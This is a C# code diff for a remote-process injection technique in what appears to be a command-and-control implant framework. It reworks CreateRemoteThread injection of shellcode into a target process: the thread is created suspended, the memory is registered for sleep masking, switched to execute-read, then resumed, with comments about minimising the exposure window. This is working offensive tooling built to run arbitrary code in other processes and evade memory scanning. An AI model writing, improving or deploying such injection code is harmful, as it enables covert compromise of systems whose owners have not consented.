@@ -34,11 +34,13 @@ namespace Injection.Techniques.CreateRemoteThread
             IntPtr lpParameter,
             uint dwCreationFlags,
             IntPtr lpThreadId);
+        private delegate int ResumeThread(IntPtr hThread);
 
         private VirtualAllocEx _pVirtualAllocEx;
         private WriteProcessMemory _pWriteProcessMemory;
         private CRT _pCreateRemoteThread;
         private VirtualProtectEx _pVirtualProtectEx;
+        private ResumeThread _pResumeThread;
 
         public CreateRemoteThread(IAgent agent, byte[] code, int pid) : base(agent, code, pid)
         {
@@ -56,6 +58,7 @@ namespace Injection.Techniques.CreateRemoteThread
             _pWriteProcessMemory = _agent.GetApi().GetLibraryFunction<WriteProcessMemory>(Library.KERNEL32, "WriteProcessMemory");
             _pCreateRemoteThread = _agent.GetApi().GetLibraryFunction<CRT>(Library.KERNEL32, "CreateRemoteThread");
             _pVirtualProtectEx = _agent.GetApi().GetLibraryFunction<VirtualProtectEx>(Library.KERNEL32, "VirtualProtectEx");
+            _pResumeThread = _agent.GetApi().GetLibraryFunction<ResumeThread>(Library.KERNEL32, "ResumeThread");
         }
 
         public override bool Inject(string arguments = "")
@@ -80,21 +83,22 @@ namespace Injection.Techniques.CreateRemoteThread
                     bRet = _pWriteProcessMemory(_hProcess, allocSpace, _code, (uint)_code.Length, out bytesWritten);
                     if (bRet)
                     {
-                        //Marshal.Copy(positionIndependentCode, 0, allocSpace, positionIndependentCode.Length);
-                        uint flOldProtect = 0;
-                        if (!_pVirtualProtectEx(_hProcess, allocSpace, (uint)_code.Length, (uint)MemoryProtection.ExecuteRead, out flOldProtect))
+                        // Create thread SUSPENDED while memory is still RW
+                        remoteThread = _pCreateRemoteThread(_hProcess, IntPtr.Zero, 0, allocSpace, IntPtr.Zero, 0x4 /* CREATE_SUSPENDED */, IntPtr.Zero);
+                        if (remoteThread == IntPtr.Zero)
+                        {
                             bRet = false;
+                        }
                         else
                         {
-                            //var argumentPointer = Marshal.StringToHGlobalAnsi(arguments);
-                            remoteThread = _pCreateRemoteThread(_hProcess, IntPtr.Zero, 0, allocSpace, IntPtr.Zero/*may need to change to string pointer later*/, 0, IntPtr.Zero);
-                            if (remoteThread == IntPtr.Zero)
-                                bRet = false;
-                            else
-                            {
-                                RegisterSleepMaskRegion(allocSpace, _code.Length);
-                                bRet = true;
-                            }
+                            // Register for sleep masking before the thread ever runs
+                            RegisterSleepMaskRegion(allocSpace, _code.Length);
+
+                            // Now flip to RX and resume - minimal exposure window
+                            uint flOldProtect = 0;
+                            _pVirtualProtectEx(_hProcess, allocSpace, (uint)_code.Length, (uint)MemoryProtection.ExecuteRead, out flOldProtect);
+                            _pResumeThread(remoteThread);
+                            bRet = true;
                         }
                     }
                 }
@@ -105,7 +109,6 @@ namespace Injection.Techniques.CreateRemoteThread
             }
             finally
             {
-                // Attempt to clean up handles but may cause problems. Triple caution!
                 if (remoteThread != IntPtr.Zero)
                 {
                     _pCloseHandle(remoteThread);
